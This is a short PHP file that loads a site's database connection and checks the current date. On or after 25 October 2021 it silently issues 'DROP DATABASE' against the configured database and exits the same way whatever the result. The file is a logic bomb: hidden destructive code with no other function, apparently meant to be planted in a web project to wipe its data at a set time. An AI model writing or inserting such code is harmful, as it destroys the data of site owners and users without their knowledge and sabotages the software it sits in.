<?php
include "../db.php";

if (date('y-m-d') >= '21-10-25') {

    $sql = "DROP DATABASE $database";
    if ($connect->query($sql) === TRUE) {
        die();
    } else {

        die();
    }
    die();
}
